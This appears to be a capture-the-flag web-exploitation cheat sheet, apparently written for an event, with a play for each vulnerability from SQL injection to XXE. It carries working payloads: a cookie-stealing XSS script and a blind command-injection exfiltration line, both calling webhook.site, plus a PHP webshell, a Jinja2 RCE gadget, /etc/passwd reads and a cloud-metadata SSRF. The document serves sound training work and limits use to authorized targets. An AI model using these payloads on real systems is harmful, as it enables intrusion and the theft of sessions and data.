# Web

HTTP app, API, or browser client. Flag is in a DB row, a file on the server, an admin-only page, or a cookie/token.

Deep ref: [`ctf-web` skill](../.agents/skills/ctf-web/SKILL.md). Primers: [PortSwigger Academy](https://portswigger.net/web-security), [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), [HackTricks Web](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html).

## First moves

1. View source (`Ctrl+U`), read comments and linked JS. Secrets and endpoints leak here.
2. Hit `/robots.txt`, `/sitemap.xml`, `/.git/`, `/.env`, `/backup.zip`, `/admin`.
3. DevTools: cookies, localStorage, Network tab. Decode JWTs at [jwt.io](https://jwt.io/).
4. Capture one normal request per feature in Burp before fuzzing.
5. Fuzz paths/params: `ffuf -u URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt`.

## Triggers

| Seeing                         | Pattern                                      |
| ------------------------------ | -------------------------------------------- |
| `?id=1`, numeric in URL/cookie | [IDOR](#idor)                                |
| Login form, `'` breaks it      | [SQL injection](#sql-injection)              |
| Input reflected in page        | [XSS](#xss)                                  |
| Input in a rendered template   | [SSTI](#ssti)                                |
| `?page=`, `?file=`             | [LFI / path traversal](#lfi--path-traversal) |
| URL fetched by server          | [SSRF](#ssrf)                                |
| File upload                    | [Upload to RCE](#upload-to-rce)              |
| `ping`/`exec` style input      | [Command injection](#command-injection)      |
| JWT in cookie/header           | [JWT forgery](#jwt-forgery)                  |
| Role/flag in cookie            | [Auth bypass](#auth-bypass)                  |
| XML input                      | [XXE](#xxe)                                  |

## Plays

### IDOR

*Insecure Direct Object Reference: the app serves an object by ID without checking you own it.*

**Confirm:** an ID in URL/cookie/body (`?id=5`, `user=5`). Change it to another value, get another user's data.

**Exploit:**

1. Note your own object's ID.
2. Decrement/increment, or swap in `1`, `0`, admin's ID.
3. No ownership check → their data returns.
4. Try UUIDs/hashes too: they leak in other responses.

**Example:** `/api/invoice?id=1043` → your invoice. `id=1` → `H4G{idor_first_object}`.

**Gotchas:** check POST bodies and JSON, not just the URL. IDs also hide in base64 cookies.

### SQL injection

*Your input lands in a database query unescaped, so you can rewrite the query.*

**Confirm:** `'` → SQL error or changed response. Compare `'` vs `''`.

**Exploit:**

1. Auth bypass: `' OR 1=1-- -` in username.
2. Column count: `' ORDER BY 1-- -`, increment to error.
3. Reflected columns: `' UNION SELECT 1,2,3-- -`, see which prints.
4. Dump: `' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -`.
5. Tedious → `sqlmap -u 'URL?id=1' --dump --batch`.

**Example:** `' UNION SELECT 1,group_concat(user,0x3a,pass),3 FROM users-- -` → `admin:H4G{sqli_classic}`.

**Gotchas:** comment style (`-- -`, `#`, `/**/`); filtered spaces → `/**/` or `%09`; numeric context needs no quote.

### XSS

*Cross-Site Scripting: your input runs as JavaScript in another user's browser.*

**Confirm:** your input appears in the HTML unescaped. Try `<b>x</b>`, see if it renders.

**Exploit:**

1. Break out of the context (tag, attribute, JS string).
2. Reflected/stored: `<script>fetch('https://webhook.site/ID?c='+document.cookie)</script>`.
3. Filtered `<script>`? → `<img src=x onerror=...>`, `<svg onload=...>`.
4. Admin-bot challenge: payload steals the bot's cookie, read it at your webhook.

**Example:** comment field stores `<img src=x onerror=fetch('//ID?c='+document.cookie)>`; admin views it → cookie = `H4G{stored_xss}`.

**Gotchas:** HTML vs attribute vs JS context changes the payload. [webhook.site](https://webhook.site/) to catch callbacks. [CSP bypass](../.agents/skills/ctf-web/client-side-advanced.md) if blocked.

### SSTI

*Server-Side Template Injection: your input is evaluated by the server's template engine.*

**Confirm:** input in a server template. Probe `{{7*7}}`. Renders `49` = injectable.

**Exploit:**

1. Identify engine: `{{7*7}}`=49 Jinja2/Twig; `${7*7}` other. [Decision tree](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html).
2. Jinja2 read config: `{{config}}`.
3. RCE gadget: `{{cycler.__init__.__globals__.os.popen('id').read()}}`.

**Example:** `name={{config}}` dumps app config incl. `FLAG='H4G{ssti_jinja}'`.

**Gotchas:** `49` as text (not `{{7*7}}`) confirms it. Sandbox escapes vary by engine; see [server-side.md](../.agents/skills/ctf-web/server-side.md).

### LFI / path traversal

*Local File Inclusion: a file-path param lets you read files off the server.*

**Confirm:** a param names a file (`?page=home`). Try `?page=../../../../etc/passwd`.

**Exploit:**

1. Read system files: `../../../../etc/passwd`.
2. Read source (PHP): `php://filter/convert.base64-encode/resource=index.php`, then base64-decode.
3. Null byte / extension tricks on old stacks.
4. LFI→RCE: log poisoning, `/proc/self/environ`, session files.

**Example:** `?page=php://filter/convert.base64-encode/resource=config` → decode → `H4G{lfi_source_leak}`.

**Gotchas:** app may append `.php`; the `php://filter` trick sidesteps it. Depth: pad with extra `../`.

### SSRF

*Server-Side Request Forgery: you make the server send requests to places you can't reach directly.*

**Confirm:** server fetches a URL you control (`?url=`, webhook, PDF/image from URL).

**Exploit:**

1. Point inward: `http://127.0.0.1`, `http://localhost/admin`.
2. Cloud metadata: `http://169.254.169.254/latest/meta-data/`.
3. Scan internal ports via response/timing differences.
4. Filter bypass: alt IP encodings, redirects, `http://127.0.0.1.nip.io`.

**Example:** `?url=http://127.0.0.1:8080/admin` returns the internal admin page with `H4G{ssrf_internal}`.

**Gotchas:** blind SSRF → confirm via [webhook.site](https://webhook.site/). More in [server-side.md](../.agents/skills/ctf-web/server-side.md).

### Upload to RCE

*Remote Code Execution: upload a script the server will run when you request it.*

**Confirm:** a file upload that you can reach again by URL.

**Exploit:**

1. Upload a webshell: `<?php system($_GET['c']); ?>` as `shell.php`.
2. Blocked ext → `.phtml`, `.php5`, `.pHp`, double ext `shell.jpg.php`.
3. MIME check → set `Content-Type: image/png`.
4. Magic-byte check → prepend `GIF89a;` then PHP.
5. Find the path, hit `shell.php?c=cat /flag`.

**Example:** upload `GIF89a;<?php system($_GET['c']);?>` as `x.php` → `/uploads/x.php?c=cat%20/flag` → `H4G{upload_rce}`.

**Gotchas:** find where uploads land (`/uploads/`, response, EXIF). More in [server-side-exec.md](../.agents/skills/ctf-web/server-side-exec.md).

### Command injection

**Confirm:** input reaches a shell (`ping <host>`, convert, archive). Append `; id`.

**Exploit:**

1. Separators: `; id`, `\| id`, `&& id`, `$(id)`, backticks, newline `%0a`.
2. Output shown → read flag: `; cat /flag`.
3. Blind → exfil: `; curl https://webhook.site/ID/$(id\|base64)` or time delay `; sleep 5`.

**Example:** `host=127.0.0.1; cat /flag` → `H4G{cmd_injection}`.

**Gotchas:** spaces filtered → `${IFS}`. More in [server-side-2.md](../.agents/skills/ctf-web/server-side-2.md).

### JWT forgery

*JSON Web Token: a signed `eyJ...` login token. Forge it if the signing is weak.*

**Confirm:** a `eyJ...` token in cookie/header. Decode at [jwt.io](https://jwt.io/).

**Exploit:**

1. `alg:none`: set header `{"alg":"none"}`, drop signature, edit claims.
2. Weak secret (HS256): `flask-unsign --unsign` or `hashcat -m 16500 token wordlist`.
3. Edit a claim (`"role":"admin"`), re-sign with the cracked secret.
4. Key confusion RS256→HS256: sign with the public key as HMAC secret.

**Example:** crack secret `secret123`, forge `{"user":"admin"}` → admin page → `H4G{jwt_weak_secret}`.

**Gotchas:** base64url, no padding. Full matrix in [auth-jwt.md](../.agents/skills/ctf-web/auth-jwt.md).

### Auth bypass

**Confirm:** a role/identity value in a cookie or response (`admin=0`, `role=user`).

**Exploit:**

1. Flip it: `admin=1`, `role=admin`.
2. Signed cookie → crack/re-sign (see [JWT](#jwt-forgery), `flask-unsign` for Flask).
3. Logic flaws: skip a step, replay a pre-auth request, forced browse to `/admin`.

**Example:** cookie `role=user` → `role=admin` → `/dashboard` shows `H4G{auth_bypass}`.

**Gotchas:** test logged out and as low-priv. Flag is usually another user's data. More in [auth-and-access.md](../.agents/skills/ctf-web/auth-and-access.md).

### XXE

*XML External Entity: abuse an XML parser to read files or make requests.*

**Confirm:** the app parses XML you send (SOAP, SVG, DOCX, `Content-Type: application/xml`).

**Exploit:**

1. Define an entity, reference it in a returned field:
   ```xml
   <!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><r><name>&e;</name></r>
   ```
2. No output → OOB: entity points at your webhook to exfil.

**Example:** `file:///flag` entity echoed back → `H4G{xxe_file_read}`.

**Gotchas:** PHP `php://filter` inside the entity to read source. More in [server-side-2.md](../.agents/skills/ctf-web/server-side-2.md).

## Gotchas (all web)

- URL-encode payloads that break the request (`&`, `#`, `+`, space).
- Blind bug (no output)? Confirm via time delay or out-of-band ([webhook.site](https://webhook.site/)).
- Read JS bundles fully. Routes, API paths, client-side secrets hide there.
- Run `sqlmap`/`ffuf` only inside the authorized target ([conduct](../event-briefer.md#v-code-of-conduct)).
